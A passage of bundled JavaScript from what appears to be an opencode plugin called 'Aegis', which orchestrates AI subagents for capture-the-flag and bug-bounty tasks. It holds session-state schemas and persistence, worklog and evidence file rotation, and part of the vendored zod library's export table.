      `- session: ${sessionID}`,
      `- reason: ${reason}`,
      `- mode/phase/target: ${state.mode}/${state.phase}/${state.targetType}`,
      `- scope/candidate: ${state.scopeConfirmed}/${state.candidatePendingVerification}`,
      `- counters: verify_fail=${state.verifyFailCount}, no_new=${state.noNewEvidenceLoops}, same_payload=${state.samePayloadLoops}, context_fail=${state.contextFailCount}, timeout_fail=${state.timeoutFailCount}`,
      `- next: ${decision.primary} (${decision.reason})`,
      ""
    ].join(`
`);
    this.appendWithBudget("WORKLOG.md", block, this.budgets.WORKLOG);
  }
  appendEvidence(sessionID, state) {
    const verified = state.latestVerified || state.latestCandidate;
    if (!verified) {
      return;
    }
    const block = [
      "",
      `## ${this.now()}`,
      `- session: ${sessionID}`,
      `- verified: ${verified}`,
      ""
    ].join(`
`);
    this.appendWithBudget("EVIDENCE.md", block, this.budgets.EVIDENCE);
  }
  appendWithBudget(fileName, content, budget) {
    const path = join6(this.rootDir, fileName);
    appendFileSync(path, content, "utf-8");
    this.rotateIfNeeded(fileName, budget);
  }
  rotateIfNeeded(fileName, budget) {
    const path = join6(this.rootDir, fileName);
    if (!existsSync5(path)) {
      return false;
    }
    const content = readFileSync5(path, "utf-8");
    const lineCount = content.length === 0 ? 0 : content.split(/\r?\n/).length;
    const byteCount = Buffer.byteLength(content, "utf-8");
    if (lineCount <= budget.lines && byteCount <= budget.bytes) {
      return false;
    }
    const stamp = this.archiveStamp();
    const stem = fileName.replace(/\.md$/i, "");
    const archived = join6(this.archiveDir, `${stem}_${stamp}.md`);
    renameSync2(path, archived);
    writeFileSync2(path, `# ${stem}

Rotated at ${this.now()}

`, "utf-8");
    return true;
  }
  inspectFile(fileName, budget) {
    const path = join6(this.rootDir, fileName);
    if (!existsSync5(path)) {
      return null;
    }
    const content = readFileSync5(path, "utf-8");
    const lineCount = content.length === 0 ? 0 : content.split(/\r?\n/).length;
    const byteCount = Buffer.byteLength(content, "utf-8");
    if (lineCount <= budget.lines && byteCount <= budget.bytes) {
      return null;
    }
    return {
      fileName,
      lineCount,
      byteCount,
      maxLines: budget.lines,
      maxBytes: budget.bytes
    };
  }
  now() {
    return new Date().toISOString();
  }
  archiveStamp() {
    return new Date().toISOString().replace(/[:.]/g, "-");
  }
}

// src/state/session-id.ts
function normalizeSessionID(sessionID) {
  const normalized = sessionID.replace(/[^a-z0-9_-]+/gi, "_").slice(0, 64);
  return normalized.length > 0 ? normalized : "session";
}

// src/state/session-store.ts
import { existsSync as existsSync6, mkdirSync as mkdirSync3, readFileSync as readFileSync6, renameSync as renameSync3, rmSync, writeFileSync as writeFileSync3 } from "fs";
import { dirname as dirname2, join as join7 } from "path";
var FailureReasonCountsSchema = exports_external.object({
  none: exports_external.number().int().nonnegative(),
  verification_mismatch: exports_external.number().int().nonnegative(),
  tooling_timeout: exports_external.number().int().nonnegative(),
  context_overflow: exports_external.number().int().nonnegative(),
  hypothesis_stall: exports_external.number().int().nonnegative(),
  unsat_claim: exports_external.number().int().nonnegative(),
  static_dynamic_contradiction: exports_external.number().int().nonnegative(),
  exploit_chain: exports_external.number().int().nonnegative(),
  environment: exports_external.number().int().nonnegative()
});
var ModelHealthEntrySchema = exports_external.object({
  unhealthySince: exports_external.number().int().nonnegative().default(0),
  reason: exports_external.string().default("")
});
var SubagentDispatchHealthSchema = exports_external.object({
  successCount: exports_external.number().int().nonnegative().default(0),
  retryableFailureCount: exports_external.number().int().nonnegative().default(0),
  hardFailureCount: exports_external.number().int().nonnegative().default(0),
  consecutiveFailureCount: exports_external.number().int().nonnegative().default(0),
  lastOutcomeAt: exports_external.number().int().nonnegative().default(0)
});
var SubagentProfileOverrideSchema = exports_external.object({
  model: exports_external.string().min(1),
  variant: exports_external.string().min(1)
});
var SessionStateSchema = exports_external.object({
  mode: exports_external.enum(["CTF", "BOUNTY"]),
  modeExplicit: exports_external.boolean().default(false),
  ultraworkEnabled: exports_external.boolean().default(false),
  thinkMode: exports_external.enum(["none", "think", "ultrathink"]).default("none"),
  autoLoopEnabled: exports_external.boolean().default(false),
  autoLoopIterations: exports_external.number().int().nonnegative().default(0),
  autoLoopStartedAt: exports_external.number().int().nonnegative().default(0),
  autoLoopLastPromptAt: exports_external.number().int().nonnegative().default(0),
  phase: exports_external.enum(["SCAN", "PLAN", "EXECUTE"]),
  targetType: exports_external.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]),
  scopeConfirmed: exports_external.boolean(),
  candidatePendingVerification: exports_external.boolean(),
  latestCandidate: exports_external.string(),
  latestVerified: exports_external.string(),
  hypothesis: exports_external.string(),
  alternatives: exports_external.array(exports_external.string()),
  noNewEvidenceLoops: exports_external.number().int().nonnegative(),
  samePayloadLoops: exports_external.number().int().nonnegative(),
  staleToolPatternLoops: exports_external.number().int().nonnegative().default(0),
  lastToolPattern: exports_external.string().default(""),
  contradictionPivotDebt: exports_external.number().int().nonnegative().default(0),
  contradictionPatchDumpDone: exports_external.boolean().default(false),
  mdScribePrimaryStreak: exports_external.number().int().nonnegative().default(0),
  verifyFailCount: exports_external.number().int().nonnegative(),
  readonlyInconclusiveCount: exports_external.number().int().nonnegative(),
  contextFailCount: exports_external.number().int().nonnegative(),
  timeoutFailCount: exports_external.number().int().nonnegative(),
  envParityChecked: exports_external.boolean().default(false),
  envParityAllMatch: exports_external.boolean().default(false),
  envParityRequired: exports_external.boolean().default(false),
  envParityRequirementReason: exports_external.string().default(""),
  envParitySummary: exports_external.string().default(""),
  envParityUpdatedAt: exports_external.number().int().nonnegative().default(0),
  revVmSuspected: exports_external.boolean().default(false),
  revRiskScore: exports_external.number().nonnegative().default(0),
  revRiskSignals: exports_external.array(exports_external.string()).default([]),
  revStaticTrust: exports_external.number().min(0).max(1).default(1),
  recentEvents: exports_external.array(exports_external.string()),
  lastTaskCategory: exports_external.string(),
  lastTaskRoute: exports_external.string().default(""),
  lastTaskSubagent: exports_external.string().default(""),
  lastTaskModel: exports_external.string().default(""),
  lastTaskVariant: exports_external.string().default(""),
  pendingTaskFailover: exports_external.boolean(),
  taskFailoverCount: exports_external.number().int().nonnegative(),
  dispatchHealthBySubagent: exports_external.record(exports_external.string(), SubagentDispatchHealthSchema).default({}),
  subagentProfileOverrides: exports_external.record(exports_external.string(), SubagentProfileOverrideSchema).default({}),
  modelHealthByModel: exports_external.record(exports_external.string(), ModelHealthEntrySchema).default({}),
  lastFailureReason: exports_external.enum([
    "none",
    "verification_mismatch",
    "tooling_timeout",
    "context_overflow",
    "hypothesis_stall",
    "unsat_claim",
    "static_dynamic_contradiction",
    "exploit_chain",
    "environment"
  ]),
  lastFailureSummary: exports_external.string(),
  lastFailedRoute: exports_external.string(),
  lastFailureAt: exports_external.number().int().nonnegative(),
  failureReasonCounts: FailureReasonCountsSchema,
  lastUpdatedAt: exports_external.number().int().nonnegative()
});
var SessionMapSchema = exports_external.record(exports_external.string(), SessionStateSchema);
var CONTRADICTION_PATCH_LOOP_BUDGET = 2;
var CONTRADICTION_PIVOT_AGENTS = new Set([
  "ctf-web",
  "ctf-web3",
  "ctf-pwn",
  "ctf-rev",
  "ctf-crypto",
  "ctf-forensics",
  "ctf-explore",
  "ctf-research",
  "bounty-triage",
  "bounty-research"
]);

class SessionStore {
  filePath;
  stateMap = new Map;
  observer;
  defaultMode;
  persistenceDegraded = false;
  observerDegraded = false;
  constructor(baseDirectory, observer, defaultMode = DEFAULT_STATE.mode, stateRootDir = ".Aegis") {
    this.filePath = join7(baseDirectory, stateRootDir, "orchestrator_state.json");
    this.observer = observer;
    this.defaultMode = defaultMode;
    this.load();
  }
  get(sessionID) {
    const existing = this.stateMap.get(sessionID);
    if (existing) {
      return existing;
    }
    const fresh = {
      ...DEFAULT_STATE,
      mode: this.defaultMode,
      alternatives: [...DEFAULT_STATE.alternatives],
      recentEvents: [...DEFAULT_STATE.recentEvents],
      failureReasonCounts: { ...DEFAULT_STATE.failureReasonCounts },
      lastTaskModel: "",
      lastTaskVariant: "",
      dispatchHealthBySubagent: {},
      subagentProfileOverrides: {},
      modelHealthByModel: {},
      lastUpdatedAt: Date.now()
    };
    this.stateMap.set(sessionID, fresh);
    return fresh;
  }
  setMode(sessionID, mode) {
    const state = this.get(sessionID);
    state.mode = mode;
    state.modeExplicit = true;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_mode");
    return state;
  }
  setUltraworkEnabled(sessionID, enabled) {
    const state = this.get(sessionID);
    state.ultraworkEnabled = enabled;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_ultrawork_enabled");
    return state;
  }
  setThinkMode(sessionID, mode) {
    const state = this.get(sessionID);
    state.thinkMode = mode;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_think_mode");
    return state;
  }
  setAutoLoopEnabled(sessionID, enabled) {
    const state = this.get(sessionID);
    state.autoLoopEnabled = enabled;
    if (!enabled) {
      state.autoLoopIterations = 0;
      state.autoLoopStartedAt = 0;
      state.autoLoopLastPromptAt = 0;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_auto_loop_enabled");
    return state;
  }
  recordAutoLoopPrompt(sessionID) {
    const state = this.get(sessionID);
    const now = Date.now();
    if (state.autoLoopStartedAt <= 0) {
      state.autoLoopStartedAt = now;
    }
    state.autoLoopIterations += 1;
    state.autoLoopLastPromptAt = now;
    state.lastUpdatedAt = now;
    this.persist();
    this.notify(sessionID, state, "record_auto_loop_prompt");
    return state;
  }
  setTargetType(sessionID, targetType) {
    const state = this.get(sessionID);
    state.targetType = targetType;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_target_type");
    return state;
  }
  setHypothesis(sessionID, hypothesis) {
    const state = this.get(sessionID);
    state.hypothesis = hypothesis;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_hypothesis");
    return state;
  }
  setAlternatives(sessionID, alternatives) {
    const state = this.get(sessionID);
    state.alternatives = alternatives.map((item) => item.trim()).filter((item) => item.length > 0);
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_alternatives");
    return state;
  }
  setEnvParity(sessionID, allMatch, summary = "") {
    const state = this.get(sessionID);
    state.envParityChecked = true;
    state.envParityAllMatch = allMatch;
    state.envParitySummary = summary.trim();
    state.envParityUpdatedAt = Date.now();
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_env_parity");
    return state;
  }
  setEnvParityRequired(sessionID, required2, reason = "") {
    const state = this.get(sessionID);
    state.envParityRequired = required2;
    state.envParityRequirementReason = reason.trim();
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_env_parity_required");
    return state;
  }
  setRevRisk(sessionID, risk) {
    const state = this.get(sessionID);
    state.revVmSuspected = risk.vmSuspected;
    state.revRiskScore = risk.score;
    state.revRiskSignals = [...risk.signals];
    state.revStaticTrust = risk.staticTrust;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_rev_risk");
    return state;
  }
  setCandidate(sessionID, candidate) {
    const state = this.get(sessionID);
    state.latestCandidate = candidate;
    state.candidatePendingVerification = candidate.trim().length > 0;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_candidate");
    return state;
  }
  setVerified(sessionID, verified) {
    const state = this.get(sessionID);
    state.latestVerified = verified;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_verified");
    return state;
  }
  recordFailure(sessionID, reason, routeName = "", summary = "") {
    const state = this.get(sessionID);
    state.lastFailureReason = reason;
    state.lastFailedRoute = routeName;
    state.lastFailureSummary = summary;
    state.lastFailureAt = Date.now();
    state.failureReasonCounts[reason] += 1;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "record_failure");
    return state;
  }
  setFailureDetails(sessionID, reason, routeName = "", summary = "") {
    const state = this.get(sessionID);
    state.lastFailureReason = reason;
    state.lastFailedRoute = routeName;
    state.lastFailureSummary = summary;
    state.lastFailureAt = Date.now();
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_failure_details");
    return state;
  }
  clearFailure(sessionID) {
    const state = this.get(sessionID);
    state.lastFailureReason = "none";
    state.lastFailedRoute = "";
    state.lastFailureSummary = "";
    state.lastFailureAt = 0;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "clear_failure");
    return state;
  }
  setLastTaskCategory(sessionID, category) {
    const state = this.get(sessionID);
    state.lastTaskCategory = category;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_last_task_category");
    return state;
  }
  setLastDispatch(sessionID, routeName, subagentType, model = "", variant = "") {
    const state = this.get(sessionID);
    state.lastTaskRoute = routeName;
    state.lastTaskSubagent = subagentType;
    state.lastTaskModel = model.trim();
    state.lastTaskVariant = variant.trim();
    const normalizedRoute = routeName.trim().toLowerCase();
    if (normalizedRoute === "md-scribe") {
      state.mdScribePrimaryStreak += 1;
    } else {
      state.mdScribePrimaryStreak = 0;
    }
    const pattern = subagentType.trim() || routeName.trim();
    if (!pattern) {
      state.lastToolPattern = "";
      state.staleToolPatternLoops = 0;
    } else if (state.lastToolPattern === pattern) {
      state.staleToolPatternLoops += 1;
    } else {
      state.lastToolPattern = pattern;
      state.staleToolPatternLoops = 1;
    }
    if (state.contradictionPivotDebt > 0 && !state.contradictionPatchDumpDone) {
      state.contradictionPivotDebt = Math.max(0, state.contradictionPivotDebt - 1);
      const normalizedSubagent = subagentType.trim().toLowerCase();
      const normalizedRouteName = routeName.trim().toLowerCase();
      if (CONTRADICTION_PIVOT_AGENTS.has(normalizedSubagent) || CONTRADICTION_PIVOT_AGENTS.has(normalizedRouteName)) {
        state.contradictionPatchDumpDone = true;
      }
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_last_dispatch");
    return state;
  }
  recordDispatchOutcome(sessionID, outcome) {
    const state = this.get(sessionID);
    const subagentType = state.lastTaskSubagent.trim();
    if (!subagentType) {
      return state;
    }
    const health = this.getOrCreateDispatchHealth(state, subagentType);
    health.lastOutcomeAt = Date.now();
    if (outcome === "success") {
      health.successCount += 1;
      health.consecutiveFailureCount = 0;
    } else if (outcome === "retryable_failure") {
      health.retryableFailureCount += 1;
      health.consecutiveFailureCount += 1;
    } else {
      health.hardFailureCount += 1;
      health.consecutiveFailureCount += 1;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "record_dispatch_outcome");
    return state;
  }
  setSubagentProfileOverride(sessionID, subagentType, profile) {
    const state = this.get(sessionID);
    const key = subagentType.trim();
    const model = profile.model.trim();
    const variant = profile.variant.trim();
    if (!key || !model) {
      return state;
    }
    state.subagentProfileOverrides[key] = {
      model,
      variant
    };
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "set_subagent_profile_override");
    return state;
  }
  clearSubagentProfileOverride(sessionID, subagentType) {
    const state = this.get(sessionID);
    const key = typeof subagentType === "string" ? subagentType.trim() : "";
    if (key) {
      delete state.subagentProfileOverrides[key];
    } else {
      state.subagentProfileOverrides = {};
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "clear_subagent_profile_override");
    return state;
  }
  triggerTaskFailover(sessionID) {
    const state = this.get(sessionID);
    state.pendingTaskFailover = true;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "trigger_task_failover");
    return state;
  }
  consumeTaskFailover(sessionID) {
    const state = this.get(sessionID);
    state.pendingTaskFailover = false;
    state.taskFailoverCount += 1;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "consume_task_failover");
    return state;
  }
  clearTaskFailover(sessionID) {
    const state = this.get(sessionID);
    state.pendingTaskFailover = false;
    state.taskFailoverCount = 0;
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "clear_task_failover");
    return state;
  }
  applyEvent(sessionID, event) {
    const state = this.get(sessionID);
    state.recentEvents.push(event);
    if (state.recentEvents.length > 30) {
      state.recentEvents = state.recentEvents.slice(-30);
    }
    switch (event) {
      case "scan_completed":
        state.phase = "PLAN";
        break;
      case "plan_completed":
        state.phase = "EXECUTE";
        break;
      case "candidate_found":
        state.candidatePendingVerification = true;
        state.contextFailCount = Math.max(0, state.contextFailCount - 1);
        state.timeoutFailCount = Math.max(0, state.timeoutFailCount - 1);
        break;
      case "verify_success":
        state.candidatePendingVerification = false;
        if (!state.latestVerified && state.latestCandidate) {
          state.latestVerified = state.latestCandidate;
        }
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        state.verifyFailCount = 0;
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.mdScribePrimaryStreak = 0;
        state.pendingTaskFailover = false;
        state.taskFailoverCount = 0;
        break;
      case "verify_fail":
        state.candidatePendingVerification = false;
        state.verifyFailCount += 1;
        state.noNewEvidenceLoops += 1;
        state.lastFailureReason = "verification_mismatch";
        state.failureReasonCounts.verification_mismatch += 1;
        state.lastFailureAt = Date.now();
        break;
      case "no_new_evidence":
        state.noNewEvidenceLoops += 1;
        state.lastFailureReason = "hypothesis_stall";
        state.failureReasonCounts.hypothesis_stall += 1;
        state.lastFailureAt = Date.now();
        break;
      case "same_payload_repeat":
        state.samePayloadLoops += 1;
        state.lastFailureReason = "hypothesis_stall";
        state.failureReasonCounts.hypothesis_stall += 1;
        state.lastFailureAt = Date.now();
        break;
      case "new_evidence":
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.pendingTaskFailover = false;
        state.taskFailoverCount = 0;
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        state.contextFailCount = Math.max(0, state.contextFailCount - 1);
        state.timeoutFailCount = Math.max(0, state.timeoutFailCount - 1);
        break;
      case "readonly_inconclusive":
        state.readonlyInconclusiveCount += 1;
        break;
      case "scope_confirmed":
        state.scopeConfirmed = true;
        break;
      case "context_length_exceeded":
        state.contextFailCount += 1;
        state.lastFailureReason = "context_overflow";
        state.failureReasonCounts.context_overflow += 1;
        state.lastFailureAt = Date.now();
        break;
      case "timeout":
        state.timeoutFailCount += 1;
        state.lastFailureReason = "tooling_timeout";
        state.failureReasonCounts.tooling_timeout += 1;
        state.lastFailureAt = Date.now();
        break;
      case "unsat_claim":
        state.lastFailureReason = "unsat_claim";
        state.failureReasonCounts.unsat_claim += 1;
        state.lastFailureAt = Date.now();
        break;
      case "static_dynamic_contradiction":
        state.lastFailureReason = "static_dynamic_contradiction";
        state.failureReasonCounts.static_dynamic_contradiction += 1;
        state.lastFailureAt = Date.now();
        state.contradictionPivotDebt = CONTRADICTION_PATCH_LOOP_BUDGET;
        state.contradictionPatchDumpDone = false;
        break;
      case "reset_loop":
        state.noNewEvidenceLoops = 0;
        state.samePayloadLoops = 0;
        state.staleToolPatternLoops = 0;
        state.lastToolPattern = "";
        state.contradictionPivotDebt = 0;
        state.contradictionPatchDumpDone = false;
        state.mdScribePrimaryStreak = 0;
        state.readonlyInconclusiveCount = 0;
        state.lastFailureReason = "none";
        state.lastFailureSummary = "";
        state.lastFailedRoute = "";
        state.lastFailureAt = 0;
        break;
    }
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, event);
    return state;
  }
  markModelUnhealthy(sessionID, modelId, reason) {
    const state = this.get(sessionID);
    state.modelHealthByModel[modelId] = {
      unhealthySince: Date.now(),
      reason
    };
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "mark_model_unhealthy");
    return state;
  }
  markModelHealthy(sessionID, modelId) {
    const state = this.get(sessionID);
    delete state.modelHealthByModel[modelId];
    state.lastUpdatedAt = Date.now();
    this.persist();
    this.notify(sessionID, state, "mark_model_healthy");
    return state;
  }
  toJSON() {
    const obj = {};
    for (const [key, value] of this.stateMap.entries()) {
      obj[key] = value;
    }
    return obj;
  }
  load() {
    if (!existsSync6(this.filePath)) {
      return;
    }
    try {
      const raw = readFileSync6(this.filePath, "utf-8");
      const parsed = SessionMapSchema.safeParse(JSON.parse(raw));
      if (!parsed.success) {
        return;
      }
      for (const [sessionID, state] of Object.entries(parsed.data)) {
        this.stateMap.set(sessionID, {
          ...DEFAULT_STATE,
          ...state,
          alternatives: [...state.alternatives],
          recentEvents: [...state.recentEvents],
          failureReasonCounts: { ...state.failureReasonCounts },
          dispatchHealthBySubagent: { ...state.dispatchHealthBySubagent },
          subagentProfileOverrides: { ...state.subagentProfileOverrides },
          modelHealthByModel: { ...state.modelHealthByModel }
        });
      }
    } catch {}
  }
  persist() {
    if (this.persistenceDegraded) {
      return;
    }
    const dir = dirname2(this.filePath);
    try {
      mkdirSync3(dir, { recursive: true });
      const tmpPath = `${this.filePath}.tmp`;
      const payload = JSON.stringify(this.toJSON(), null, 2) + `
`;
      writeFileSync3(tmpPath, payload, "utf-8");
      try {
        if (existsSync6(this.filePath)) {
          try {
            rmSync(this.filePath, { force: true });
          } catch (error48) {}
        }
        renameSync3(tmpPath, this.filePath);
      } catch {
        writeFileSync3(this.filePath, payload, "utf-8");
      }
    } catch {
      this.persistenceDegraded = true;
    }
  }
  notify(sessionID, state, reason) {
    if (!this.observer || this.observerDegraded) {
      return;
    }
    try {
      this.observer({
        sessionID,
        state: { ...state },
        reason
      });
    } catch {
      this.observerDegraded = true;
    }
  }
  getOrCreateDispatchHealth(state, subagentType) {
    const existing = state.dispatchHealthBySubagent[subagentType];
    if (existing) {
      return existing;
    }
    const fresh = {
      successCount: 0,
      retryableFailureCount: 0,
      hardFailureCount: 0,
      consecutiveFailureCount: 0,
      lastOutcomeAt: 0
    };
    state.dispatchHealthBySubagent[subagentType] = fresh;
    return fresh;
  }
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/external.js
var exports_external2 = {};
__export(exports_external2, {
  xid: () => xid4,
  void: () => _void4,
  uuidv7: () => uuidv72,
  uuidv6: () => uuidv62,
  uuidv4: () => uuidv42,
  uuid: () => uuid5,
  util: () => exports_util2,
  url: () => url2,
  uppercase: () => _uppercase2,
  unknown: () => unknown2,
  union: () => union2,
  undefined: () => _undefined6,
  ulid: () => ulid4,
  uint64: () => uint642,
  uint32: () => uint322,
  tuple: () => tuple2,
  trim: () => _trim2,
  treeifyError: () => treeifyError2,
  transform: () => transform2,
  toUpperCase: () => _toUpperCase2,
  toLowerCase: () => _toLowerCase2,
  toJSONSchema: () => toJSONSchema2,
  templateLiteral: () => templateLiteral2,
  symbol: () => symbol2,
  superRefine: () => superRefine2,
  success: () => success2,
  stringbool: () => stringbool2,
  stringFormat: () => stringFormat2,
  string: () => string5,
  strictObject: () => strictObject2,
  startsWith: () => _startsWith2,
  size: () => _size2,
  setErrorMap: () => setErrorMap2,
  set: () => set2,
  safeParseAsync: () => safeParseAsync4,
  safeParse: () => safeParse4,
  safeEncodeAsync: () => safeEncodeAsync4,
  safeEncode: () => safeEncode4,
  safeDecodeAsync: () => safeDecodeAsync4,
  safeDecode: () => safeDecode4,
  registry: () => registry2,
  regexes: () => exports_regexes2,
  regex: () => _regex2,
  refine: () => refine2,
  record: () => record2,
  readonly: () => readonly2,
  property: () => _property2,
  promise: () => promise2,
  prettifyError: () => prettifyError2,
  preprocess: () => preprocess2,
  prefault: () => prefault2,
  positive: () => _positive2,
  pipe: () => pipe2,
  partialRecord: () => partialRecord2,
  parseAsync: () => parseAsync4,
  parse: () => parse7,
  overwrite: () => _overwrite2,
  optional: () => optional2,
  object: () => object2,
  number: () => number5,
  nullish: () => nullish4,
  nullable: () => nullable2,
  null: () => _null6,
  normalize: () => _normalize2,
  nonpositive: () => _nonpositive2,
  nonoptional: () => nonoptional2,
  nonnegative: () => _nonnegative2,
  never: () => never2,
  negative: () => _negative2,
  nativeEnum: () => nativeEnum2,
  nanoid: () => nanoid4,
  nan: () => nan2,
  multipleOf: () => _multipleOf2,
  minSize: () => _minSize2,
  minLength: () => _minLength2,
  mime: () => _mime2,
  maxSize: () => _maxSize2,
  maxLength: () => _maxLength2,
  map: () => map2,
  lte: () => _lte2,
  lt: () => _lt2,
  lowercase: () => _lowercase2,
  looseObject: () => looseObject2,
  locales: () => exports_locales2,
  literal: () => literal2,
  length: () => _length2,
  lazy: () => lazy2,
  ksuid: () => ksuid4,
  keyof: () => keyof2,
  jwt: () => jwt2,
  json: () => json2,
  iso: () => exports_iso2,
  ipv6: () => ipv64,
  ipv4: () => ipv44,
  intersection: () => intersection2,
  int64: () => int642,
  int32: () => int322,
  int: () => int2,
  instanceof: () => _instanceof2,
  includes: () => _includes2,
  httpUrl: () => httpUrl2,
  hostname: () => hostname4,
  hex: () => hex4,
  hash: () => hash2,
  guid: () => guid4,
  gte: () => _gte2,
  gt: () => _gt2,
  globalRegistry: () => globalRegistry2,
  getErrorMap: () => getErrorMap2,
  function: () => _function2,
  formatError: () => formatError2,
  float64: () => float642,
  float32: () => float322,
  flattenError: () => flattenError2,
  file: () => file2,
  enum: () => _enum4,
  endsWith: () => _endsWith2,
  encodeAsync: () => encodeAsync4,
  encode: () => encode4,
  emoji: () => emoji4,
  email: () => email4,
  e164: () => e1644,
  discriminatedUnion: () => discriminatedUnion2,
  decodeAsync: () => decodeAsync4,
  decode: () => decode4,
  date: () => date7,
  custom: () => custom2,
  cuid2: () => cuid24,
  cuid: () => cuid6,
  core: () => exports_core4,
  config: () => config2,
  coerce: () => exports_coerce2,
  codec: () => codec2,
  clone: () => clone2,
  cidrv6: () => cidrv64,
  cidrv4: () => cidrv44,
  check: () => check2,
  catch: () => _catch4,
  boolean: () => boolean5,
  bigint: () => bigint5,
  base64url: () => base64url4,
  base64: () => base644,
  array: () => array2,
  any: () => any2,
  _function: () => _function2,
  _default: () => _default4,
  _ZodString: () => _ZodString2,
  ZodXID: () => ZodXID2,
  ZodVoid: () => ZodVoid2,
  ZodUnknown: () => ZodUnknown2,
  ZodUnion: () => ZodUnion2,
  ZodUndefined: () => ZodUndefined2,
  ZodUUID: () => ZodUUID2,
  ZodURL: () => ZodURL2,
  ZodULID: () => ZodULID2,
  ZodType: () => ZodType2,
  ZodTuple: () => ZodTuple2,
  ZodTransform: () => ZodTransform2,
  ZodTemplateLiteral: () => ZodTemplateLiteral2,
  ZodSymbol: () => ZodSymbol2,
  ZodSuccess: () => ZodSuccess2,
  ZodStringFormat: () => ZodStringFormat2,
  ZodString: () => ZodString2,
  ZodSet: () => ZodSet2,
  ZodRecord: () => ZodRecord2,
  ZodRealError: () => ZodRealError2,
  ZodReadonly: () => ZodReadonly2,
  ZodPromise: () => ZodPromise2,
  ZodPrefault: () => ZodPrefault2,
  ZodPipe: () => ZodPipe2,
  ZodOptional: () => ZodOptional2,
  ZodObject: () => ZodObject2,
  ZodNumberFormat: () => ZodNumberFormat2,
  ZodNumber: () => ZodNumber2,
  ZodNullable: () => ZodNullable2,
  ZodNull: () => ZodNull2,
  ZodNonOptional: () => ZodNonOptional2,
  ZodNever: () => ZodNever2,
  ZodNanoID: () => ZodNanoID2,
  ZodNaN: () => ZodNaN2,
  ZodMap: () => ZodMap2,
  ZodLiteral: () => ZodLiteral2,
  ZodLazy: () => ZodLazy2,
  ZodKSUID: () => ZodKSUID2,
  ZodJWT: () => ZodJWT2,
  ZodIssueCode: () => ZodIssueCode2,
  ZodIntersection: () => ZodIntersection2,
  ZodISOTime: () => ZodISOTime2,
  ZodISODuration: () => ZodISODuration2,
  ZodISODateTime: () => ZodISODateTime2,
  ZodISODate: () => ZodISODate2,
  ZodIPv6: () => ZodIPv62,
  ZodIPv4: () => ZodIPv42,
  ZodGUID: () => ZodGUID2,
  ZodFunction: () => ZodFunction2,
  ZodFirstPartyTypeKind: () => ZodFirstPartyTypeKind2,
  ZodFile: () => ZodFile2,
  ZodError: () => ZodError2,
  ZodEnum: () => ZodEnum2,
  ZodEmoji: () => ZodEmoji2,
  ZodEmail: () => ZodEmail2,
  ZodE164: () => ZodE1642,
  ZodDiscriminatedUnion: () => ZodDiscriminatedUnion2,
  ZodDefault: () => ZodDefault2,
  ZodDate: () => ZodDate2,
  ZodCustomStringFormat: () => ZodCustomStringFormat2,
  ZodCustom: () => ZodCustom2,
  ZodCodec: () => ZodCodec2,
  ZodCatch: () => ZodCatch2,
  ZodCUID2: () => ZodCUID22,
  ZodCUID: () => ZodCUID3,
  ZodCIDRv6: () => ZodCIDRv62,
  ZodCIDRv4: () => ZodCIDRv42,
  ZodBoolean: () => ZodBoolean2,
  ZodBigIntFormat: () => ZodBigIntFormat2,
  ZodBigInt: () => ZodBigInt2,
  ZodBase64URL: () => ZodBase64URL2,
  ZodBase64: () => ZodBase642,
  ZodArray: () => ZodArray2,
  ZodAny: () => ZodAny2,
  TimePrecision: () => TimePrecision2,
  NEVER: () => NEVER2,
  $output: () => $output2,
  $input: () => $input2,
  $brand: () => $brand2
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/index.js
var exports_core4 = {};
__export(exports_core4, {
  version: () => version2,
  util: () => exports_util2,
  treeifyError: () => treeifyError2,
  toJSONSchema: () => toJSONSchema2,
  toDotPath: () => toDotPath2,
  safeParseAsync: () => safeParseAsync3,
  safeParse: () => safeParse3,
